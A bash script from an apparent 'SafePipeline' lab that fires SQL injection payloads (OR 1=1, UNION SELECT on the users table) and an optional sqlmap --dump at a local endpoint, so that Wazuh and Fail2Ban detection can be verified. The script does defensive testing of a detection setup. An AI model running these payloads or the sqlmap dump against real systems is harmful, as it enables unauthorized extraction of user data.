#!/bin/bash
# SafePipeline — SQL Injection attack on /api/users
# Tool: sqlmap (or manual payloads)
# Detection: Wazuh alert (rule 100004) + Fail2Ban ban
#
# Usage: bash sqli_test.sh [target_ip] [target_port]
# Example: bash sqli_test.sh localhost 5000
#
# ⚠️  Run ONLY against localhost or a controlled environment you own.

TARGET=${1:-localhost}
PORT=${2:-5000}
BASE_URL="http://$TARGET:$PORT"

echo "[*] SafePipeline — SQL Injection Simulation"
echo "[*] Target : $BASE_URL/api/users?id="
echo ""

echo "[*] Checking target is reachable..."
if ! curl -s --connect-timeout 3 "$BASE_URL/login" > /dev/null; then
    echo "[!] Cannot reach $TARGET:$PORT — start the app first."
    exit 1
fi

echo "[+] Target reachable. Running manual SQLi payloads..."
echo ""

# --- Payload 1: Basic bypass ---
echo "[>] Payload 1 — Basic bypass: id=1 OR 1=1"
RESP=$(curl -s "$BASE_URL/api/users?id=1 OR 1=1")
echo "    Response: $RESP"
echo ""

# --- Payload 2: UNION-based injection ---
echo "[>] Payload 2 — UNION: id=1 UNION SELECT 1,username FROM users--"
RESP=$(curl -s "$BASE_URL/api/users?id=1 UNION SELECT 1,username FROM users--")
echo "    Response: $RESP"
echo ""

# --- Payload 3: Extract all users ---
echo "[>] Payload 3 — Dump all: id=0 UNION SELECT id,username FROM users"
RESP=$(curl -s "$BASE_URL/api/users?id=0 UNION SELECT id,username FROM users")
echo "    Response: $RESP"
echo ""

# --- Payload 4: sqlmap (if available) ---
if command -v sqlmap &> /dev/null; then
    echo "[>] Payload 4 — sqlmap full scan"
    sqlmap \
        -u "$BASE_URL/api/users?id=1" \
        --dbms=sqlite \
        --dump \
        --batch \
        --level=2 \
        --risk=1 \
        --output-dir=./sqlmap_output
    echo "[+] sqlmap report saved to ./sqlmap_output/"
else
    echo "[!] sqlmap not installed — manual payloads only"
    echo "    Install: pip install sqlmap"
fi

echo ""
echo "[+] Done. Check:"
echo "    - /var/log/safepipeline/app.log for sqli_attempt events"
echo "    - Wazuh dashboard for alert (rule 100004 — SQL injection)"
echo "    - Fail2Ban: sudo fail2ban-client status safepipeline-sqli"
